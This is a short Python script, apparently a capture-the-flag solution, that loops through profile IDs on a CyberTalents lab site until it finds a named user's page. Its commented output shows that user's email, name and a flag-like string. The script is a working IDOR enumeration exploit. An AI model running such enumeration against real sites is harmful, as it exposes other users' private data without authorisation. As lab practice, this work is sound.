import requests
import random
from datetime import datetime, timedelta
import string
for i in range(1,1000):
    r = requests.get(f"http://wcomol2z7qrsm350m73p9p6tqzqw873okkxmswvy-web.cybertalentslabs.com/profile/{i}")
    if "Mariel Calderwood" in r.text:
        print(f"ID of user is: {i}")
        print(r.text)
        break

# Output
# mohamed1234
# ID of user is: 262
# mcalderwood79@storify.com
# Mariel Calderwood
# CH5CSTBK6QH6N8J77VNR8KN44RAHXNP2